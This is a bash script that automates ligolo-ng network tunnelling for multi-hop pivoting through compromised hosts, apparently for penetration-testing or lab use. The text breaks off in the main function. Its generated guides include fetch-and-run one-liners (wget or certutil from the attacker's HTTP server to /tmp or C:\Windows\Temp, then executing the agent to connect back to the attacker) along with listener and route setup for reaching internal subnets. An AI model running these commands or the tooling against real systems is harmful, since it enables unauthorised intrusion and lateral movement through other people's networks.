#!/bin/bash
#==============================================================================
#                         LIGOLO-NG AUTOMATION v4.0
#==============================================================================
# CRITICAL FIX: Pivot2+ listeners must forward to PREVIOUS PIVOT's IP!
#               Using 127.0.0.1 on Pivot2+ creates a LOCALHOST LOOP!
#==============================================================================

set -o pipefail

LIGOLO_VERSION="v0.7.2-alpha"
WORK_DIR="$HOME/ligolo"
LIGOLO_PORT=11601

#------------------------------------------------------------------------------
# COLORS
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

#------------------------------------------------------------------------------
# LOGGING
#------------------------------------------------------------------------------
info()    { echo -e "${CYAN}[*]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
error()   { echo -e "${RED}[-]${NC} $1"; }
cmd()     { echo -e "    ${GREEN}$1${NC}"; }
note()    { echo -e "    ${WHITE}# $1${NC}"; }

#------------------------------------------------------------------------------
# PORT MANAGEMENT
#------------------------------------------------------------------------------
random_port() {
    local min=${1:-10000}
    local max=${2:-60000}
    if [[ -r /dev/urandom ]]; then
        echo $(( min + $(od -An -tu2 -N2 /dev/urandom | tr -d ' ') % (max - min) ))
    else
        echo $(( min + RANDOM % (max - min) ))
    fi
}

port_in_use() {
    local port=$1
    ss -tuln 2>/dev/null | grep -qE ":${port}\b" || \
    netstat -tuln 2>/dev/null | grep -qE ":${port}\b"
}

find_free_port() {
    local base=${1:-10000}
    local max_attempts=50
    local port
    
    for ((i=0; i<max_attempts; i++)); do
        port=$(random_port 10000 60000)
        if ! port_in_use "$port"; then
            echo "$port"
            return 0
        fi
    done
    
    port=$base
    while port_in_use "$port"; do ((port++)); done
    echo "$port"
}

check_ligolo_port() {
    if port_in_use "$LIGOLO_PORT"; then
        warn "Port $LIGOLO_PORT is in use!"
        read -p "Kill the process? [y/N]: " choice
        if [[ "$choice" =~ ^[Yy]$ ]]; then
            local pid=$(lsof -ti:$LIGOLO_PORT 2>/dev/null | head -1)
            [[ -n "$pid" ]] && kill -9 "$pid" 2>/dev/null && sleep 1 && success "Killed"
        else
            LIGOLO_PORT=$(find_free_port 11601)
            warn "Using alternative port: $LIGOLO_PORT"
        fi
    fi
}

get_default_ip() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || \
    ip -4 addr show tap0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || \
    ip -4 route get 1 2>/dev/null | grep -oP 'src \K\d+(\.\d+){3}' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}'
}

#------------------------------------------------------------------------------
# BINARY FUNCTIONS
#------------------------------------------------------------------------------
verify_binary() {
    local file=$1
    local min_size=1000000
    [[ ! -f "$file" ]] && return 1
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null)
    [[ $size -lt $min_size ]] && return 1
    if [[ "$file" == *.exe ]]; then
        head -c 2 "$file" 2>/dev/null | grep -q "MZ" || return 1
    else
        file "$file" 2>/dev/null | grep -q "ELF" || return 1
    fi
    return 0
}

get_binary_info() {
    local file=$1
    if [[ -f "$file" ]]; then
        local size=$(stat -c%s "$file" 2>/dev/null)
        local md5=$(md5sum "$file" 2>/dev/null | cut -d' ' -f1)
        echo "$size:$md5"
    else
        echo "0:none"
    fi
}

setup_binaries() {
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR" || exit 1
    
    local BASE_URL="https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}"
    
    if ! verify_binary "proxy"; then
        info "Downloading proxy..."
        rm -f proxy proxy.tar.gz 2>/dev/null
        wget -q --show-progress "$BASE_URL/ligolo-ng_proxy_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O proxy.tar.gz && \
        tar -xzf proxy.tar.gz proxy 2>/dev/null && rm -f proxy.tar.gz LICENSE README.md && chmod +x proxy
        verify_binary "proxy" && success "Proxy downloaded" || error "Proxy failed"
    else
        success "Proxy OK"
    fi
    
    if ! verify_binary "agent"; then
        info "Downloading Linux agent..."
        rm -f agent agent.tar.gz 2>/dev/null
        wget -q --show-progress "$BASE_URL/ligolo-ng_agent_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O agent.tar.gz && \
        tar -xzf agent.tar.gz agent 2>/dev/null && rm -f agent.tar.gz LICENSE README.md && chmod +x agent
        verify_binary "agent" && success "Linux agent downloaded" || error "Linux agent failed"
    else
        success "Linux agent OK"
    fi
    
    if ! verify_binary "agent.exe"; then
        info "Downloading Windows agent..."
        rm -f agent.exe agent.zip 2>/dev/null
        wget -q --show-progress "$BASE_URL/ligolo-ng_agent_${LIGOLO_VERSION#v}_windows_amd64.zip" -O agent.zip && \
        unzip -qo agent.zip agent.exe 2>/dev/null && rm -f agent.zip LICENSE README.md
        verify_binary "agent.exe" && success "Windows agent downloaded" || error "Windows agent failed"
    else
        success "Windows agent OK"
    fi
    
    local agent_info=$(get_binary_info "$WORK_DIR/agent")
    local win_info=$(get_binary_info "$WORK_DIR/agent.exe")
    AGENT_SIZE=$(echo "$agent_info" | cut -d: -f1)
    AGENT_MD5=$(echo "$agent_info" | cut -d: -f2)
    WIN_SIZE=$(echo "$win_info" | cut -d: -f1)
    WIN_MD5=$(echo "$win_info" | cut -d: -f2)
}

#------------------------------------------------------------------------------
# INTERFACE MANAGEMENT
#------------------------------------------------------------------------------
get_interface_name() {
    local num="${1:-1}"
    if [[ "$num" -eq 1 ]]; then
        echo "ligolo"
    else
        echo "ligolo${num}"
    fi
}

setup_interface() {
    local iface="${1:-ligolo}"
    
    if ip link show "$iface" &>/dev/null; then
        sudo ip link set "$iface" up 2>/dev/null
        success "Interface '$iface' ready"
    else
        info "Creating $iface interface..."
        if sudo ip tuntap add user "$(whoami)" mode tun "$iface" 2>/dev/null; then
            sudo ip link set "$iface" up
            success "Interface '$iface' created"
        else
            error "Failed to create $iface"
            cmd "sudo ip tuntap add user $(whoami) mode tun $iface"
            cmd "sudo ip link set $iface up"
            return 1
        fi
    fi
    
    [[ "$iface" == "ligolo" ]] && sudo ip route add 240.0.0.1/32 dev ligolo 2>/dev/null || true
    return 0
}

list_interfaces() {
    echo ""
    info "Ligolo interfaces:"
    local found=0
    for i in 1 2 3 4 5 6 7 8; do
        local iface=$(get_interface_name $i)
        if ip link show "$iface" &>/dev/null; then
            found=1
            local state=$(ip link show "$iface" 2>/dev/null | grep -oP 'state \K\w+')
            echo -e "    ${GREEN}✓${NC} $iface ($state)"
            ip route show dev "$iface" 2>/dev/null | while read line; do
                echo -e "        → $line"
            done
        fi
    done
    [[ $found -eq 0 ]] && echo -e "    ${YELLOW}(none)${NC}"
}

#------------------------------------------------------------------------------
# GENERATE COMMANDS FILE
#------------------------------------------------------------------------------
generate_commands() {
    cat > "$WORK_DIR/commands.txt" << CMDEOF
================================================================================
LIGOLO-NG COMMANDS v4.0 - MULTI-PIVOT EDITION
================================================================================
Attacker IP:    $ATTACKER_IP
Ligolo Port:    $LIGOLO_PORT
HTTP Port:      $HTTP_PORT
================================================================================

=== QUICK START ===

# Terminal 1: HTTP Server
cd $WORK_DIR && python3 -m http.server $HTTP_PORT

# Pivot1 (Linux):
wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

# Pivot1 (Windows):
certutil -urlcache -f http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

================================================================================
CRITICAL: LISTENER RULES
================================================================================

⚠️  PIVOT1 ONLY uses 127.0.0.1:
    listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

⚠️  PIVOT2+ must forward to PREVIOUS PIVOT's INTERNAL IP:
    Pivot2: listener_add --addr 0.0.0.0:$LIGOLO_PORT --to PIVOT1_IP:$LIGOLO_PORT --tcp
    Pivot3: listener_add --addr 0.0.0.0:$LIGOLO_PORT --to PIVOT2_IP:$LIGOLO_PORT --tcp
    Pivot4: listener_add --addr 0.0.0.0:$LIGOLO_PORT --to PIVOT3_IP:$LIGOLO_PORT --tcp

❌ WRONG (creates localhost loop on Pivot2+):
    listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

================================================================================
PIVOT 1 (Direct to Attacker)
================================================================================

1. Agent connects to ATTACKER:
   /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

2. In Ligolo:
   session → ifconfig → start

3. Add route:
   sudo ip route add 172.16.0.0/16 dev ligolo

4. Create listener (for Pivot2 to connect):
   listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp
                                                ^^^^^^^^^^^
                                                OK here - forwards to your proxy

================================================================================
PIVOT 2 (Through Pivot1)
================================================================================

1. Create ligolo2:
   sudo ip tuntap add user \$(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up

2. Agent on Pivot2 connects to PIVOT1's internal IP:
   /tmp/agent -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert
                       ^^^^^^^^^^^
                       PIVOT1's internal IP!

3. In Ligolo:
   session (select Pivot2) → start --tun ligolo2

4. Add route:
   sudo ip route add <PIVOT2_NETWORK>/24 dev ligolo2

5. Create listener for Pivot3 (CRITICAL - use PIVOT1's IP, not 127.0.0.1!):
   listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 172.16.5.15:$LIGOLO_PORT --tcp
                                                ^^^^^^^^^^^
                                                PIVOT1's internal IP!

================================================================================
PIVOT 3 (Through Pivot2)
================================================================================

1. Create ligolo3:
   sudo ip tuntap add user \$(whoami) mode tun ligolo3 && sudo ip link set ligolo3 up

2. Agent on Pivot3 connects to PIVOT2's internal IP:
   /tmp/agent -connect 172.16.5.35:$LIGOLO_PORT -ignore-cert
                       ^^^^^^^^^^^
                       PIVOT2's internal IP!

3. In Ligolo:
   session (select Pivot3) → start --tun ligolo3

4. Add route:
   sudo ip route add <PIVOT3_NETWORK>/24 dev ligolo3

5. Create listener for Pivot4 (use PIVOT2's IP!):
   listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 172.16.5.35:$LIGOLO_PORT --tcp
                                                ^^^^^^^^^^^
                                                PIVOT2's internal IP!

================================================================================
PIVOT 4 (Through Pivot3)
================================================================================

1. Create ligolo4:
   sudo ip tuntap add user \$(whoami) mode tun ligolo4 && sudo ip link set ligolo4 up

2. Agent on Pivot4 connects to PIVOT3's internal IP:
   /tmp/agent -connect 172.16.6.35:$LIGOLO_PORT -ignore-cert
                       ^^^^^^^^^^^
                       PIVOT3's internal IP!

3. In Ligolo:
   session (select Pivot4) → start --tun ligolo4

4. Add route:
   sudo ip route add <PIVOT4_NETWORK>/24 dev ligolo4

================================================================================
QUICK REFERENCE TABLE
================================================================================

┌─────────┬───────────┬─────────────────────┬──────────────────────────────────┐
│ PIVOT   │ INTERFACE │ AGENT CONNECTS TO   │ LISTENER FORWARDS TO             │
├─────────┼───────────┼─────────────────────┼──────────────────────────────────┤
│ Pivot1  │ ligolo    │ ATTACKER:$LIGOLO_PORT      │ 127.0.0.1:$LIGOLO_PORT (proxy)          │
│ Pivot2  │ ligolo2   │ PIVOT1_IP:$LIGOLO_PORT     │ PIVOT1_IP:$LIGOLO_PORT (upstream)       │
│ Pivot3  │ ligolo3   │ PIVOT2_IP:$LIGOLO_PORT     │ PIVOT2_IP:$LIGOLO_PORT (upstream)       │
│ Pivot4  │ ligolo4   │ PIVOT3_IP:$LIGOLO_PORT     │ PIVOT3_IP:$LIGOLO_PORT (upstream)       │
└─────────┴───────────┴─────────────────────┴──────────────────────────────────┘

RULE: Each pivot forwards UPSTREAM to the previous pivot, NEVER to 127.0.0.1!
      Only Pivot1 uses 127.0.0.1 (because it talks directly to your proxy).

================================================================================
TROUBLESHOOTING
================================================================================

ERROR: "yamux: keepalive failed: connection write timeout"
ERROR: "127.0.0.1:11601 -> 127.0.0.1:XXXXX"
CAUSE: Listener on Pivot2+ is forwarding to 127.0.0.1 (localhost loop!)
FIX:   Use PREVIOUS PIVOT's IP instead:
       listener_add --addr 0.0.0.0:$LIGOLO_PORT --to PREVIOUS_PIVOT_IP:$LIGOLO_PORT --tcp

ERROR: "bind: address already in use"
CAUSE: Listener already exists
FIX:   listener_list → listener_stop <ID>

ERROR: "a tunnel is already using this interface name"
FIX:   start --tun ligolo2 (use different interface)

================================================================================
CMDEOF

    success "Commands saved to $WORK_DIR/commands.txt"
}

#------------------------------------------------------------------------------
# PRINT INSTRUCTIONS
#------------------------------------------------------------------------------
print_instructions() {
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}              LIGOLO-NG READY - MULTI-PIVOT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo -e "  Attacker IP:    ${GREEN}$ATTACKER_IP${NC}"
    echo -e "  Ligolo Port:    ${GREEN}$LIGOLO_PORT${NC}"
    echo -e "  HTTP Port:      ${GREEN}$HTTP_PORT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 1: Start HTTP server${NC}"
    cmd "cd $WORK_DIR && python3 -m http.server $HTTP_PORT"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 2: On Pivot1${NC}"
    cmd "wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent && chmod +x /tmp/agent"
    cmd "/tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 3: In Ligolo${NC}"
    echo -e "    ${GREEN}session${NC} (arrow keys) → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 4: Add route${NC}"
    cmd "sudo ip route add <NETWORK>/24 dev ligolo"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "  ${WHITE}Commands:${NC}       ${YELLOW}cat $WORK_DIR/commands.txt${NC}"
    echo -e "  ${WHITE}Pivot guide:${NC}    ${YELLOW}$0 pivot${NC}"
    echo -e "  ${WHITE}Add interface:${NC}  ${YELLOW}$0 interface 2${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
}

#------------------------------------------------------------------------------
# SHOW PIVOT GUIDE - FIXED LISTENER LOGIC
#------------------------------------------------------------------------------
show_pivot_guide() {
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}              MULTI-PIVOT COMPLETE GUIDE v4.0${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${RED}${BOLD}  ⚠️  CRITICAL LISTENER RULE:${NC}"
    echo -e "${RED}${BOLD}      Pivot1: forward to 127.0.0.1 (your proxy)${NC}"
    echo -e "${RED}${BOLD}      Pivot2+: forward to PREVIOUS PIVOT's IP (NOT 127.0.0.1!)${NC}"
    echo ""
    echo -e "${WHITE}  Using 127.0.0.1 on Pivot2+ creates a LOCALHOST LOOP!${NC}"
    echo -e "${WHITE}  This causes: yamux keepalive timeout, connection refused${NC}"
    echo ""
    
    # Architecture
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  ARCHITECTURE${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐"
    echo -e "  │ ATTACKER │◄───│  PIVOT1  │◄───│  PIVOT2  │◄───│  PIVOT3  │"
    echo -e "  │ Proxy    │    │          │    │          │    │          │"
    echo -e "  └──────────┘    └──────────┘    └──────────┘    └──────────┘"
    echo -e "       ▲               │               │               │"
    echo -e "       │          forwards to     forwards to     forwards to"
    echo -e "       │          127.0.0.1       PIVOT1_IP       PIVOT2_IP"
    echo -e "       │          (proxy)         (upstream)      (upstream)"
    echo -e "    ligolo         ligolo2         ligolo3         ligolo4"
    echo ""
    
    # PIVOT 1
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  PIVOT 1 - Direct Connection${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1. Run agent on Pivot1:${NC}"
    cmd "/tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}2. In Ligolo:${NC}"
    cmd "session"
    cmd "ifconfig"
    cmd "start"
    echo ""
    echo -e "  ${WHITE}3. Add route:${NC}"
    cmd "sudo ip route add 172.16.0.0/16 dev ligolo"
    echo ""
    echo -e "  ${WHITE}4. Create listener for Pivot2:${NC}"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo -e "                                          ${GREEN}^^^^^^^^^^^ OK - your proxy${NC}"
    echo ""
    
    # PIVOT 2
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  PIVOT 2 - Through Pivot1${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1. Create interface:${NC}"
    cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up"
    echo ""
    echo -e "  ${WHITE}2. Run agent on Pivot2 (connect to PIVOT1):${NC}"
    cmd "/tmp/agent -connect PIVOT1_INTERNAL_IP:$LIGOLO_PORT -ignore-cert"
    echo -e "                        ${YELLOW}^^^^^^^^^^^^^^^^^ e.g., 172.16.5.15${NC}"
    echo ""
    echo -e "  ${WHITE}3. In Ligolo:${NC}"
    cmd "session"
    note "Select Pivot2"
    cmd "start --tun ligolo2"
    echo ""
    echo -e "  ${WHITE}4. Add route:${NC}"
    cmd "sudo ip route add <PIVOT2_NETWORK>/24 dev ligolo2"
    echo ""
    echo -e "  ${WHITE}5. Create listener for Pivot3:${NC}"
    echo -e "  ${RED}${BOLD}   ⚠️  USE PIVOT1's IP, NOT 127.0.0.1!${NC}"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to PIVOT1_IP:$LIGOLO_PORT --tcp"
    echo -e "                                          ${GREEN}^^^^^^^^^ e.g., 172.16.5.15${NC}"
    echo ""
    echo -e "  ${RED}   ❌ WRONG: --to 127.0.0.1:$LIGOLO_PORT (creates localhost loop!)${NC}"
    echo -e "  ${GREEN}   ✓ RIGHT: --to 172.16.5.15:$LIGOLO_PORT (forwards upstream)${NC}"
    echo ""
    
    # PIVOT 3
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  PIVOT 3 - Through Pivot2${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1. Create interface:${NC}"
    cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo3 && sudo ip link set ligolo3 up"
    echo ""
    echo -e "  ${WHITE}2. Run agent on Pivot3 (connect to PIVOT2):${NC}"
    cmd "/tmp/agent -connect PIVOT2_INTERNAL_IP:$LIGOLO_PORT -ignore-cert"
    echo -e "                        ${YELLOW}^^^^^^^^^^^^^^^^^ e.g., 172.16.5.35${NC}"
    echo ""
    echo -e "  ${WHITE}3. In Ligolo:${NC}"
    cmd "session"
    note "Select Pivot3"
    cmd "start --tun ligolo3"
    echo ""
    echo -e "  ${WHITE}4. Add route:${NC}"
    cmd "sudo ip route add <PIVOT3_NETWORK>/24 dev ligolo3"
    echo ""
    echo -e "  ${WHITE}5. Create listener for Pivot4:${NC}"
    echo -e "  ${RED}${BOLD}   ⚠️  USE PIVOT2's IP, NOT 127.0.0.1!${NC}"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to PIVOT2_IP:$LIGOLO_PORT --tcp"
    echo -e "                                          ${GREEN}^^^^^^^^^ e.g., 172.16.5.35${NC}"
    echo ""
    
    # PIVOT 4
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  PIVOT 4 - Through Pivot3${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1. Create interface:${NC}"
    cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo4 && sudo ip link set ligolo4 up"
    echo ""
    echo -e "  ${WHITE}2. Run agent on Pivot4 (connect to PIVOT3):${NC}"
    cmd "/tmp/agent -connect PIVOT3_INTERNAL_IP:$LIGOLO_PORT -ignore-cert"
    echo -e "                        ${YELLOW}^^^^^^^^^^^^^^^^^ e.g., 172.16.6.35${NC}"
    echo ""
    echo -e "  ${WHITE}3. In Ligolo:${NC}"
    cmd "session"
    note "Select Pivot4"
    cmd "start --tun ligolo4"
    echo ""
    echo -e "  ${WHITE}4. Add route:${NC}"
    cmd "sudo ip route add <PIVOT4_NETWORK>/24 dev ligolo4"
    echo ""
    
    # QUICK REFERENCE
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  QUICK REFERENCE TABLE${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ┌─────────┬───────────┬─────────────────────┬──────────────────────────┐"
    echo -e "  │ ${WHITE}PIVOT${NC}   │ ${WHITE}INTERFACE${NC} │ ${WHITE}AGENT CONNECTS TO${NC}   │ ${WHITE}LISTENER FORWARDS TO${NC}     │"
    echo -e "  ├─────────┼───────────┼─────────────────────┼──────────────────────────┤"
    echo -e "  │ Pivot1  │ ligolo    │ ATTACKER:$LIGOLO_PORT      │ ${GREEN}127.0.0.1${NC}:$LIGOLO_PORT (proxy)  │"
    echo -e "  │ Pivot2  │ ligolo2   │ PIVOT1_IP:$LIGOLO_PORT     │ ${GREEN}PIVOT1_IP${NC}:$LIGOLO_PORT          │"
    echo -e "  │ Pivot3  │ ligolo3   │ PIVOT2_IP:$LIGOLO_PORT     │ ${GREEN}PIVOT2_IP${NC}:$LIGOLO_PORT          │"
    echo -e "  │ Pivot4  │ ligolo4   │ PIVOT3_IP:$LIGOLO_PORT     │ ${GREEN}PIVOT3_IP${NC}:$LIGOLO_PORT          │"
    echo -e "  └─────────┴───────────┴─────────────────────┴──────────────────────────┘"
    echo ""
    echo -e "  ${WHITE}${BOLD}RULE: Each pivot forwards UPSTREAM, never to itself (127.0.0.1)!${NC}"
    echo ""
    
    # EXAMPLE WITH REAL IPs
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  EXAMPLE WITH REAL IPs${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}Scenario:${NC}"
    echo -e "    Attacker: 10.10.14.212"
    echo -e "    Pivot1:   10.129.133.93 / 172.16.5.15"
    echo -e "    Pivot2:   172.16.5.35 / 172.16.6.35"
    echo -e "    Pivot3:   172.16.6.25 / 172.16.10.25"
    echo ""
    echo -e "  ${WHITE}Pivot1 listener:${NC}"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "  ${WHITE}Pivot2 listener (forwards to Pivot1):${NC}"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 172.16.5.15:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "  ${WHITE}Pivot3 listener (forwards to Pivot2):${NC}"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 172.16.5.35:$LIGOLO_PORT --tcp"
    echo ""
    
    # TROUBLESHOOTING
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  TROUBLESHOOTING${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${RED}\"yamux: keepalive failed: connection write timeout\"${NC}"
    echo -e "  ${RED}\"127.0.0.1:11601 -> 127.0.0.1:XXXXX\"${NC}"
    echo -e "    ${WHITE}CAUSE:${NC} Listener on Pivot2+ forwarding to 127.0.0.1 (localhost loop!)"
    echo -e "    ${WHITE}FIX:${NC}   Use PREVIOUS PIVOT's IP:"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to PREVIOUS_PIVOT_IP:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "  ${RED}\"bind: address already in use\"${NC}"
    echo -e "    ${WHITE}CAUSE:${NC} Listener already exists"
    echo -e "    ${WHITE}FIX:${NC}   listener_list → listener_stop <ID>"
    echo ""
    echo -e "  ${RED}\"a tunnel is already using this interface name\"${NC}"
    echo -e "    ${WHITE}FIX:${NC}   start --tun ligolo2 (use different interface)"
    echo ""
}

#------------------------------------------------------------------------------
# ADD ROUTE
#------------------------------------------------------------------------------
add_route() {
    local network="$1"
    local iface="${2:-ligolo}"
    
    if [[ -z "$network" ]]; then
        read -p "Enter network (e.g., 172.16.0.0/16): " network
    fi
    
    if [[ "$network" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
        sudo ip route add "$network" dev "$iface" 2>/dev/null && \
            success "Route added: $network via $iface" || \
            warn "Route may already exist"
    else
        error "Invalid format. Use CIDR"
    fi
    
    echo ""
    info "Routes through $iface:"
    ip route show dev "$iface" 2>/dev/null | sed 's/^/    /'
}

#------------------------------------------------------------------------------
# STATUS
#------------------------------------------------------------------------------
show_status() {
    echo ""
    echo -e "${WHITE}${BOLD}=== LIGOLO STATUS ===${NC}"
    echo ""
    
    echo -n "Proxy: "
    if pgrep -f "ligolo.*proxy" &>/dev/null; then
        echo -e "${GREEN}RUNNING${NC} (port: $LIGOLO_PORT)"
    else
        echo -e "${YELLOW}NOT RUNNING${NC}"
    fi
    
    list_interfaces
    
    echo ""
    echo "Files:"
    for f in proxy agent agent.exe; do
        [[ -f "$WORK_DIR/$f" ]] && echo -e "    ${GREEN}✓${NC} $f"
    done
    echo ""
}

#------------------------------------------------------------------------------
# CLEANUP
#------------------------------------------------------------------------------
cleanup() {
    info "Stopping processes..."
    pkill -9 -f "ligolo.*proxy" 2>/dev/null || true
    
    info "Removing interfaces..."
    for i in 1 2 3 4 5 6 7 8; do
        local iface=$(get_interface_name $i)
        if ip link show "$iface" &>/dev/null; then
            sudo ip link set "$iface" down 2>/dev/null
            sudo ip link delete "$iface" 2>/dev/null
            echo "    Removed $iface"
        fi
    done
    
    success "Cleanup complete"
}

#------------------------------------------------------------------------------
# RUN PROXY
#------------------------------------------------------------------------------
run_proxy() {
    cd "$WORK_DIR" || exit 1
    
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}  LIGOLO PROXY - PORT $LIGOLO_PORT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "  ${YELLOW}TIP:${NC} Use ${GREEN}ARROW KEYS${NC} to select sessions!"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  MULTI-PIVOT QUICK REFERENCE${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}PIVOT 1:${NC}"
    echo -e "    Ligolo: ${GREEN}session${NC} → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo -e "    Route:  ${GREEN}sudo ip route add <NET>/24 dev ligolo${NC}"
    echo -e "    Listener: ${GREEN}listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp${NC}"
    echo ""
    echo -e "  ${WHITE}PIVOT 2:${NC}"
    echo -e "    Interface: ${GREEN}sudo ip tuntap add user \$(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up${NC}"
    echo -e "    Agent:     ${GREEN}/tmp/agent -connect PIVOT1_IP:$LIGOLO_PORT -ignore-cert${NC}"
    echo -e "    Ligolo:    ${GREEN}session${NC} → ${GREEN}start --tun ligolo2${NC}"
    echo -e "    Route:     ${GREEN}sudo ip route add <NET>/24 dev ligolo2${NC}"
    echo -e "    Listener:  ${GREEN}listener_add --addr 0.0.0.0:$LIGOLO_PORT --to ${YELLOW}PIVOT1_IP${GREEN}:$LIGOLO_PORT --tcp${NC}"
    echo -e "               ${RED}⚠️  NOT 127.0.0.1! Use PIVOT1's IP!${NC}"
    echo ""
    echo -e "  ${WHITE}PIVOT 3/4:${NC} Same pattern, forward to ${YELLOW}PREVIOUS PIVOT's IP${NC}"
    echo ""
    echo -e "  ${WHITE}Full guide:${NC} ${YELLOW}$0 pivot${NC}"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    
    exec ./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
main() {
    case "${1:-}" in
        -h|--help|help)
            echo "Usage: $0 [command] [options]"
            echo ""
            echo "Commands:"
            echo "  (no args)              Interactive setup"
            echo "  start IP               Quick start"
            echo "  route NETWORK [IFACE]  Add route"
            echo "  interface [NUM]        Create interface(s)"
            echo "  pivot                  Multi-pivot guide"
            echo "  status                 Show status"
            echo "  commands               Show commands"
            echo "  cleanup                Remove all"
            exit 0
            ;;
        
        start)
            ATTACKER_IP="${2:-$(get_default_ip)}"
